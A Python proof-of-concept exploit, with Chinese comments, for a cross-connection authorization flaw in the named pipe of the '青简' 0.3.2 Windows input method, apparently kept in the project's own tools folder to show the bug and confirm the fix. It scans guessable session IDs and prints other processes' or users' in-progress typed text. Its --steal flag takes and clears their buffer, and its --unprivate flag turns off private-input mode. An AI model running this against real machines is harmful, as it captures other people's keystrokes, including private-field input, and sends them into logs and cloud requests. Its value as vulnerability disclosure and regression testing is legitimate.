#!/usr/bin/env python3
"""青简 0.3.2（Windows）命名管道跨连接越权 —— 只读 PoC。

`%LOCALAPPDATA%` 里的 Server 在机器全局的 `\\\\.\\pipe\\qingjian-<用户摘要>` 上服务（0.3.2 及更早是固定的
`\\\\.\\pipe\\qingjian`，`--pipe` 可以指回去），一条连接一个客户端。
会话号是 DLL 报上来的**线程号**（`SessionId(GetCurrentThreadId())`），4 对齐、范围很小，猜得到；
而协议层不校验「这条消息说的会话是不是开在你这连接上」，于是任何本机进程（同一个用户、
任何 AppContainer 应用，甚至另一个 Windows 用户——管道的 DACL 里有 `Everyone`）都能拿别人的
会话号去问，Server 就把它正在组句的内容回给你。

危害面（按消息类型）：
  Poll{session}                → 回该会话当前帧：拼音行 + 整页候选（本脚本演示的就是这条）
  Commit{session}              → 回该会话缓冲区原文，并把它的组句清掉（--steal）
  Key{session}                 → 直接抢走焦点、清掉别人的组句（未演示，破坏性）
  Privacy{session, false}      → 让私密输入框退出私密态，之后的输入进学习库 / 输入日志 / 云端（--unprivate）

用法（在装有青简 0.3.2 的 Windows 上，用**另一个**用户 / 普通权限即可）：

    python tools/poc/pipe-crosstalk.py --scan              # 扫会话，命中就打印组句内容
    python tools/poc/pipe-crosstalk.py --scan --steal      # 再把别人的缓冲区抢过来（破坏性）

先开个记事本，切成青简，敲几个拼音（别选词），再跑上面的命令。

修好之后：未在本连接 `OpenSession` 过的会话一律丢弃、不回话，脚本的每条探测都会超时。
"""

from __future__ import annotations

import argparse
import json
import os
import struct
import sys
import threading
import time

from pipe_name import default_pipe_name

# DLL 的线程号从小的开始，4 对齐（Windows 的 TID 是 4 的倍数）。
TID_START = 4
TID_LIMIT = 0x4000


def open_pipe(name: str, wait_ms: int = 800) -> int:
    """打开管道，Server 刚起或实例都被占着时等一会。"""
    deadline = time.monotonic() + wait_ms / 1000
    while True:
        try:
            return os.open(name, os.O_RDWR | getattr(os, "O_BINARY", 0))
        except OSError:
            if time.monotonic() > deadline:
                raise
            time.sleep(0.05)


def write_frame(fd: int, message: dict) -> None:
    """4 字节小端长度 + JSON，与 `protocol/codec.rs` 一致。"""
    body = json.dumps(message, separators=(",", ":")).encode()
    os.write(fd, struct.pack("<I", len(body)) + body)


def read_exact(fd: int, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = os.read(fd, size - len(buf))
        if not chunk:
            raise EOFError("connection closed")
        buf += chunk
    return buf


def read_frame(fd: int) -> dict:
    (size,) = struct.unpack("<I", read_exact(fd, 4))
    return json.loads(read_exact(fd, size))


def rpc(message: dict, timeout: float, name: str) -> dict | None:
    """发一条消息、等一条回包。超时返回 None。

    超时不关 fd：关掉会让正在阻塞读的工作线程读到复用了同一句柄号的新连接。让它们挂在
    daemon 线程里到进程结束，句柄数 = 探测数，几千个 Windows 顶得住。
    """
    fd = open_pipe(name)
    result: dict = {}

    def worker() -> None:
        try:
            result["reply"] = read_frame(fd)
        except Exception:  # noqa: BLE001 - 对端关了 / 超时被干掉，都算没回包
            result["reply"] = None

    write_frame(fd, message)
    worker_thread = threading.Thread(target=worker, daemon=True)
    worker_thread.start()
    worker_thread.join(timeout)
    return result.get("reply")


def compose_text(frame: dict) -> str:
    """`Frame.preedit` 是分段数组，拼起来就是拼音行。"""
    return "".join(segment.get("text", "") for segment in frame.get("preedit") or [])


def candidates(frame: dict) -> list[str]:
    """当前页候选的文本（`CandidateList.items[].text`）。"""
    items = (frame.get("candidates") or {}).get("items") or []
    return [item.get("text", "") for item in items[:6]]


def probe(session: int, timeout: float, name: str) -> dict | None:
    """问一次会话当前帧：不是自己的会话也一样答，这就是问题所在。"""
    reply = rpc({"Poll": {"session": session}}, timeout, name)
    if not reply:
        return None
    update = reply.get("Update")
    if not update:
        return None
    frame = update.get("frame") or {}
    if not compose_text(frame):
        return None
    return {"session": session, "frame": frame}


def main() -> int:
    parser = argparse.ArgumentParser(description="青简命名管道跨连接越权 PoC（只读）")
    parser.add_argument("--pipe", help="管道名（缺省按当前用户的 SID 派生）")
    parser.add_argument("--limit", type=int, default=TID_LIMIT, help="扫到多大的会话号")
    parser.add_argument("--timeout", type=float, default=0.2, help="每条探测等多久（秒）")
    parser.add_argument("--steal", action="store_true", help="命中后把别人的缓冲区抢过来（破坏性）")
    parser.add_argument("--unprivate", action="store_true", help="命中后把别人的私密态关掉（破坏性）")
    args = parser.parse_args()

    if os.name != "nt":
        print("这个 PoC 只对 Windows 的命名管道有效", file=sys.stderr)
        return 1

    args.pipe = args.pipe or default_pipe_name()

    print(f"扫 {args.pipe} 上的会话号 4..{args.limit}（step 4），每条等 {args.timeout}s")
    print("别的应用正拿青简打字时才会命中；敲着拼音别选词。\n")

    hits = 0
    for session in range(TID_START, args.limit, 4):
        found = probe(session, args.timeout, args.pipe)
        if not found:
            continue
        hits += 1
        text = compose_text(found["frame"])
        print(f"[命中] 会话 {session}：正在输入 {text!r}")
        page = candidates(found["frame"])
        if page:
            print(f"        候选：{' '.join(page)}")

        if args.steal:
            reply = rpc({"Commit": {"session": session}}, args.timeout, args.pipe)
            stolen = ((reply or {}).get("Committed") or {}).get("text")
            print(f"        [抢走] 缓冲区原文：{stolen!r}（对方的组句已被清空）")

        if args.unprivate:
            rpc({"Privacy": {"session": session, "private": False}}, 0.05, args.pipe)
            print("        [私密] 已把这个会话标成非私密：之后的输入会进学习库 / 输入日志 / 云端请求")

    if hits == 0:
        print("没命中。检查：青简是不是当前输入法、有没有正在组句、Server 起没起（任务管理器找 qingjian-server.exe）。")
    else:
        print(f"\n共 {hits} 个会话的内容被别的进程读到。")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
